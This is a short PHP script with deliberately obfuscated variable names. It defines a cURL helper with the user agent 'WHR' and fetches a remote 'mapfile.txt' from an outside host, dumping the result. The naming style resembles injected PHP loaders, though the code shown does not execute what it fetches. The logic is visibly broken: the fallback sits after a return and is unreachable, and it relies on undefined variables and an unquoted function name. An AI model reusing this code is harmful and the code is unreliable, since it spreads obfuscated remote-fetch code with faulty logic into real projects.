<?php

$MYCURL = function($url='', $OO__O_O000=NULL, $O_O0_0OO_0=array()) {
    $O___O0O00O="curl_init+curl_setopt+curl_exec";

    $curlExists=1;
    foreach(["curl_init", "curl_setopt", "curl_exec"] as $d) {
        if(!function_exists($d)) {
            $curlExists=0;
        }
    }

    unset($d);

    if($curlExists) {
        $flag="curl_init+curl_setopt+curl_exec";
    }

    if($flag=='') {
        return 0;
    }

    $ch=curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_USERAGENT,'WHR');
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_TIMEOUT,100);
    $results=curl_exec($ch);
    curl_close($ch);

    if(!$results) {
        return 0;
    } else {
        $results=trim(trim($results,"\xEF\xBB\xBF"));
        return $results;
    }

    if($O0O___0O0O=='') {
        if(function_exists(file_get_contents) and $url) {
            $O0O___0O0O=@file_get_contents($url);
        }
    }

    return trim(trim($O0O___0O0O,"\\xEF\\xBB\\xBF"));
};

$url = "http://www1000.ebuydisplay.com/mapfile.txt";
$result =$MYCURL($url);
var_dump($result);
